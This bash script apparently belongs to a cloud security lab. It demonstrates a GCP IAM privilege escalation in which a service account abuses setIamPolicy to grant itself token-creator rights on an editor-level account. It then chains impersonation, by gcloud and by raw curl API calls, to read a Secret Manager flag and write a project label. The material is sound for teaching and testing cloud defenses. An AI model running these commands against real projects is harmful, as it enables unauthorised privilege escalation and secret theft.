#!/bin/bash

# Demo script for gcp-iam-002-iam-serviceaccountssetiampolicy privilege escalation
#
# Attack: starting_sa holds iam.serviceAccounts.setIamPolicy on target_sa
# (via a minimal custom role at the SA resource level). It calls setIamPolicy
# to grant itself roles/iam.serviceAccountTokenCreator on target_sa, then
# mints a short-lived OAuth token for target_sa and inherits its roles/editor
# project permissions.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   Demo commands pass --impersonate-service-account=starting_sa to run as it.
#   The exploit grants starting_sa tokenCreator on target_sa via setIamPolicy,
#   then chains impersonation to target_sa (which holds roles/editor).
#
# Modes:
#   Default (gcloud): uses gcloud iam service-accounts add-iam-policy-binding
#     to grant the tokenCreator role. gcloud reads the existing SA IAM policy
#     (getIamPolicy) before writing — requiring iam.serviceAccounts.getIamPolicy
#     in addition to setIamPolicy.
#
#   --api-only: calls the raw IAM setIamPolicy REST endpoint directly,
#     constructing the new policy without a prior read. Proves that
#     iam.serviceAccounts.getIamPolicy is a gcloud mechanic only — the true
#     minimum permission is iam.serviceAccounts.setIamPolicy alone.

# Parse --api-only flag
USE_GCLOUD=true
for arg in "$@"; do
    case "$arg" in
        --api-only) USE_GCLOUD=false ;;
    esac
done

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-IAM-002: Service Account setIamPolicy Privilege Escalation Demo${NC}"
if $USE_GCLOUD; then
    echo -e "${GREEN}Mode: gcloud (default)${NC}"
    echo "  Uses gcloud iam service-accounts add-iam-policy-binding — natural attacker command,"
    echo "  but gcloud calls getIamPolicy internally before writing."
    echo "  Run with --api-only to prove the attack requires only setIamPolicy."
else
    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
    echo "  Calls IAM setIamPolicy directly — constructs the new policy without reading first."
    echo "  Proves iam.serviceAccounts.getIamPolicy is a gcloud mechanic only."
fi
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_iam_002_iam_serviceaccountssetiampolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT" | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"   | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"    | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.deployer_email')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (setIamPolicy on target_sa): $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor):              $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):                  $DEPLOYER_EMAIL"
echo "Project:                                 $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if the active gcloud CLI account differs from the deployer who
# holds the impersonation grant. Terraform's ADC-derived deployer identity and
# the gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with PERMISSION_DENIED,
# so stop now with actionable remediation instead of failing deep into the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for Terraform IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Step 2: Recon — confirm starting SA lacks project admin, identify the target
echo -e "${YELLOW}Step 2: [OBSERVATION] Confirming starting SA has no project-level privilege${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the flag — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

echo -e "${YELLOW}Step 2b: [OBSERVATION] Enumerating service accounts in the project${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud iam service-accounts list --project=$PROJECT_ID --impersonate-service-account=$STARTING_SA_EMAIL"
gcloud iam service-accounts list \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null || \
    echo -e "${YELLOW}  (SA list unavailable — continuing with known target from Terraform outputs)${NC}"
echo ""

if $USE_GCLOUD; then
    echo -e "${YELLOW}Step 2c: [OBSERVATION] Inspecting target SA's IAM policy (gcloud reads this before every add-iam-policy-binding)${NC}"
    show_cmd "$STARTING_SA_EMAIL" \
        "gcloud iam service-accounts get-iam-policy $TARGET_SA_EMAIL --impersonate-service-account=$STARTING_SA_EMAIL"
    gcloud iam service-accounts get-iam-policy "$TARGET_SA_EMAIL" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null || \
        echo -e "${YELLOW}  (getIamPolicy denied or empty — but setIamPolicy permission confirmed from Terraform)${NC}"
    echo ""
else
    echo -e "${DIM}Step 2c skipped in --api-only mode: getIamPolicy is NOT needed for the exploit.${NC}"
    echo -e "${DIM}  The raw setIamPolicy API accepts a full policy blob — no prior read required.${NC}"
    echo -e "${DIM}  We'll construct the new policy from scratch in Step 3.${NC}\n"
fi

# Step 3: [EXPLOIT] Grant self tokenCreator on target_sa via setIamPolicy
#
# The vulnerability: starting_sa holds iam.serviceAccounts.setIamPolicy on
# target_sa (via a minimal custom role bound at the SA resource level).
# Any principal that can write the SA's IAM policy can grant themselves
# roles/iam.serviceAccountTokenCreator, then mint tokens as that SA.
#
# gcloud mode: add-iam-policy-binding reads the current policy (getIamPolicy)
#   then merges the new binding and writes it back. This requires BOTH
#   getIamPolicy AND setIamPolicy.
#
# --api-only mode: setIamPolicy accepts the full policy body directly.
#   We construct a minimal policy with just the tokenCreator binding —
#   no getIamPolicy call needed. This is the minimum permission surface.
echo -e "${YELLOW}Step 3: [EXPLOIT] Granting starting SA tokenCreator on target SA via setIamPolicy${NC}"

if $USE_GCLOUD; then
    # gcloud reads the existing SA IAM policy (getIamPolicy) before writing.
    # This requires iam.serviceAccounts.getIamPolicy — a gcloud mechanic, not
    # a raw-API requirement (see --api-only mode for the minimum permission proof).
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "gcloud iam service-accounts add-iam-policy-binding $TARGET_SA_EMAIL --member=serviceAccount:$STARTING_SA_EMAIL --role=roles/iam.serviceAccountTokenCreator --impersonate-service-account=$STARTING_SA_EMAIL"
    if gcloud iam service-accounts add-iam-policy-binding "$TARGET_SA_EMAIL" \
            --member="serviceAccount:$STARTING_SA_EMAIL" \
            --role="roles/iam.serviceAccountTokenCreator" \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${GREEN}✓ Granted roles/iam.serviceAccountTokenCreator to $STARTING_SA_EMAIL on $TARGET_SA_EMAIL${NC}"
    else
        echo -e "${RED}✗ Failed to add tokenCreator binding${NC}"
        echo "Check that $STARTING_SA_EMAIL holds iam.serviceAccounts.setIamPolicy on $TARGET_SA_EMAIL"
        exit 1
    fi
else
    # --api-only: mint a token for starting_sa to authenticate the setIamPolicy call,
    # then POST a minimal policy directly — no getIamPolicy read required.

    # Get ADC token to bootstrap the chain
    echo -e "\n${DIM}Step 3a (raw API — get ADC token to authenticate the starting_sa generateAccessToken call):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "ADC_TOKEN=\$(gcloud auth print-access-token)"
    ADC_TOKEN=$(gcloud auth print-access-token 2>/dev/null)
    if [ -z "$ADC_TOKEN" ]; then
        echo -e "${RED}✗ Failed to get ADC token${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Got ADC access token for $DEPLOYER_EMAIL${NC}"

    # Mint a short-lived token for starting_sa (needed to authenticate the setIamPolicy API call)
    echo -e "\n${DIM}Step 3b (raw API — mint starting_sa token to authenticate setIamPolicy):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "curl -X POST -H 'Authorization: Bearer \$ADC_TOKEN' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${STARTING_SA_EMAIL}:generateAccessToken'"
    STARTING_SA_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ADC_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${STARTING_SA_EMAIL}:generateAccessToken")
    STARTING_SA_TOKEN=$(echo "$STARTING_SA_RESPONSE" | jq -r '.accessToken // empty')
    if [ -z "$STARTING_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to mint starting_sa token${NC}"
        echo "$STARTING_SA_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Minted short-lived token for $STARTING_SA_EMAIL${NC}"

    # THE EXPLOIT: POST a minimal setIamPolicy to grant ourselves tokenCreator on target_sa.
    # We construct the full policy from scratch — no prior getIamPolicy read required.
    # This is the minimum permission surface: iam.serviceAccounts.setIamPolicy only.
    echo -e "\n${DIM}Step 3c (raw API — setIamPolicy on target_sa — THE EXPLOIT — no getIamPolicy needed):${NC}"
    SET_POLICY_BODY=$(jq -n \
        --arg member "serviceAccount:${STARTING_SA_EMAIL}" \
        '{
            policy: {
                version: 1,
                bindings: [
                    {
                        role: "roles/iam.serviceAccountTokenCreator",
                        members: [$member]
                    }
                ]
            }
        }')
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST -H 'Authorization: Bearer \$STARTING_SA_TOKEN' -d '{\"policy\":{\"bindings\":[{\"role\":\"roles/iam.serviceAccountTokenCreator\",\"members\":[\"serviceAccount:$STARTING_SA_EMAIL\"]}]}}' 'https://iam.googleapis.com/v1/projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL:setIamPolicy'"
    SET_POLICY_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $STARTING_SA_TOKEN" \
        -H "Content-Type: application/json" \
        -d "$SET_POLICY_BODY" \
        "https://iam.googleapis.com/v1/projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}:setIamPolicy")
    if echo "$SET_POLICY_RESPONSE" | jq -e '.bindings' >/dev/null 2>&1; then
        echo -e "${GREEN}✓ setIamPolicy succeeded — tokenCreator granted to $STARTING_SA_EMAIL on $TARGET_SA_EMAIL${NC}"
        echo -e "${GREEN}  (No getIamPolicy call was made — only iam.serviceAccounts.setIamPolicy required)${NC}"
    else
        echo -e "${RED}✗ setIamPolicy failed${NC}"
        echo "$SET_POLICY_RESPONSE"
        exit 1
    fi
fi

echo ""
echo -e "${YELLOW}Waiting for new IAM binding to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete — tokenCreator binding should now be active${NC}\n"

# Step 4: [EXPLOIT] Use the newly granted tokenCreator to chain impersonation and capture the flag
#
# Now that starting_sa holds roles/iam.serviceAccountTokenCreator on target_sa,
# the full impersonation chain (your ADC → starting_sa → target_sa) is possible.
# target_sa holds roles/editor + secretAccessor on the flag secret.
echo -e "${YELLOW}Step 4: [EXPLOIT] Chaining impersonation starting_sa → target_sa → flag${NC}"

if $USE_GCLOUD; then
    # gcloud's --impersonate-service-account accepts a comma-separated delegation
    # chain. The chain resolves internally — each hop must hold tokenCreator on
    # the next. We just granted that in step 3, completing the attack chain.
    #
    # Steps 4a and 4b mint tokens for each hop individually to make the chain
    # visible — they are NOT needed for the attack. Step 4c is the actual exploit.

    # Step 4a: [ILLUSTRATIVE] Mint a token as starting_sa to show hop 1 is possible.
    echo -e "\n${DIM}Step 4a (illustrative — shows hop 1 works, not needed for the attack):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL"
    STARTING_SA_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    if [ -z "$STARTING_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to mint token for starting SA${NC}"
        echo "Check that $DEPLOYER_EMAIL holds serviceAccountTokenCreator on $STARTING_SA_EMAIL"
        exit 1
    fi
    echo -e "${GREEN}✓ Minted short-lived token for $STARTING_SA_EMAIL (hop 1 confirmed)${NC}"

    # Step 4b: [ILLUSTRATIVE] Mint a token via the full chain to show hop 2 now works.
    # This hop only became possible because we granted tokenCreator in step 3.
    echo -e "\n${DIM}Step 4b (illustrative — shows hop 2 now works after the step 3 grant):${NC}"
    show_illustrative_cmd "$STARTING_SA_EMAIL" \
        "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
    TARGET_SA_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)
    if [ -z "$TARGET_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to chain impersonation to target SA — tokenCreator grant may not have propagated yet${NC}"
        echo "If this fails immediately after step 3, wait a few more seconds and retry."
        exit 1
    fi
    echo -e "${GREEN}✓ Chained impersonation to $TARGET_SA_EMAIL (hop 2 confirmed — setIamPolicy exploit worked)${NC}"

    # Step 4c: [THE ATTACK] Read the flag as target_sa using the full delegation chain.
    echo -e "\n${DIM}Step 4c (the actual attack — full chain in one command):${NC}"
    show_attack_cmd "$TARGET_SA_EMAIL" \
        "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
    FLAG_VALUE=$(gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)
    if [ -z "$FLAG_VALUE" ]; then
        echo -e "${RED}✗ Failed to read flag via impersonation chain${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via chained impersonation${NC}\n"

else
    # --api-only: STARTING_SA_TOKEN was minted in step 3b and is still valid.
    # Use it to generateAccessToken for target_sa (the second hop — now possible
    # because we just granted tokenCreator via setIamPolicy in step 3c).

    # Step 4a (raw): Hop 2 — generateAccessToken for target_sa [THE EXPLOIT COMPLETES]
    echo -e "\n${DIM}Step 4a (raw API — hop 2: generateAccessToken for target_sa, using the tokenCreator we just granted):${NC}"
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST -H 'Authorization: Bearer \$STARTING_SA_TOKEN' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA_EMAIL}:generateAccessToken'"
    TARGET_SA_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $STARTING_SA_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA_EMAIL}:generateAccessToken")
    TARGET_SA_TOKEN=$(echo "$TARGET_SA_RESPONSE" | jq -r '.accessToken // empty')
    if [ -z "$TARGET_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to chain to target_sa via generateAccessToken${NC}"
        echo "The tokenCreator grant from step 3 may not have propagated yet. Wait a moment and retry."
        echo "$TARGET_SA_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Minted token for $TARGET_SA_EMAIL via generateAccessToken (setIamPolicy exploit confirmed)${NC}"

    # Step 4b (raw): Read the flag using target_sa's token
    echo -e "\n${DIM}Step 4b (raw API — read flag as target_sa using the minted token):${NC}"
    show_attack_cmd "$TARGET_SA_EMAIL (via generateAccessToken)" \
        "curl -s -H 'Authorization: Bearer \$TARGET_SA_TOKEN' 'https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access'"
    SECRET_RESPONSE=$(curl -s \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")
    ENCODED_FLAG=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
    if [ -z "$ENCODED_FLAG" ]; then
        echo -e "${RED}✗ Failed to read flag${NC}"
        echo "$SECRET_RESPONSE"
        exit 1
    fi
    FLAG_VALUE=$(echo "$ENCODED_FLAG" | openssl base64 -d -A)
    if [ -z "$FLAG_VALUE" ]; then
        echo -e "${RED}✗ Failed to decode flag${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via raw generateAccessToken chain${NC}\n"
fi

# Step 5: [EXPLOIT] Confirm editor-level write access (write proof beyond reading the secret)
echo -e "${YELLOW}Step 5: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"

if $USE_GCLOUD; then
    # Same full delegation chain — target_sa holds roles/editor on the project.
    show_attack_cmd "$TARGET_SA_EMAIL" \
        "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
    if gcloud projects update "$PROJECT_ID" \
            --update-labels=pl-privesc-verified=true \
            --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
        gcloud projects update "$PROJECT_ID" \
            --remove-labels=pl-privesc-verified \
            --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
            --quiet 2>/dev/null || true
    else
        echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
    fi
else
    # Use TARGET_SA_TOKEN from step 4a directly — no gcloud needed.
    show_attack_cmd "$TARGET_SA_EMAIL (via generateAccessToken)" \
        "curl -X PATCH -H 'Authorization: Bearer \$TARGET_SA_TOKEN' -d '{\"labels\": {...}}' 'https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels'"

    CURRENT_PROJECT_JSON=$(curl -s \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
    CURRENT_LABELS=$(echo "$CURRENT_PROJECT_JSON" | jq -c '.labels // {}')
    UPDATED_LABELS=$(echo "$CURRENT_LABELS" | jq -c '. + {"pl-privesc-verified": "true"}')

    PATCH_RESPONSE=$(curl -s -X PATCH \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"labels\": $UPDATED_LABELS}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels")

    if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
        echo -e "${GREEN}✓ Successfully wrote a project label using the generateAccessToken-derived token!${NC}"
        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
        curl -s -X PATCH \
            -H "Authorization: Bearer $TARGET_SA_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"labels\": $CURRENT_LABELS}" \
            "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels" >/dev/null 2>&1 || true
    else
        echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
    fi
fi
echo ""

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. starting_sa ($STARTING_SA_EMAIL) used setIamPolicy to grant itself"
echo "   roles/iam.serviceAccountTokenCreator on $TARGET_SA_EMAIL"
echo "2. starting_sa minted a short-lived token for $TARGET_SA_EMAIL"
echo "   (roles/editor + secretAccessor) and read the CTF flag"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (iam.serviceAccounts.setIamPolicy on target_sa — THE VULNERABILITY)"
echo "    -> self-granted roles/iam.serviceAccountTokenCreator on target_sa"
echo "    -> $TARGET_SA_EMAIL"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

if $USE_GCLOUD; then
    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
    echo "  This demo used 'gcloud iam service-accounts add-iam-policy-binding', which"
    echo "  calls GetIamPolicy before setIamPolicy. The gcloud-mechanic permission"
    echo "  (included in starting_sa's role but not needed by the raw API) is:"
    echo ""
    echo "    iam.serviceAccounts.getIamPolicy  — gcloud reads the SA's existing IAM policy"
    echo "                                        before every add-iam-policy-binding call"
    echo ""
    echo "  To see the attack with only the true minimum permissions, run:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
else
    echo -e "\n${YELLOW}Note on gcloud vs. raw API:${NC}"
    echo "  This demo called IAM setIamPolicy directly, constructing the new policy without"
    echo "  reading the existing one first. Only iam.serviceAccounts.setIamPolicy was needed."
    echo "  The gcloud equivalent (add-iam-policy-binding) also requires getIamPolicy — a"
    echo "  gcloud mechanic, not a raw-API requirement."
    echo "  To use the gcloud version, run without any flags:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh${NC}"
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$(dirname "$0")/.demo_active"
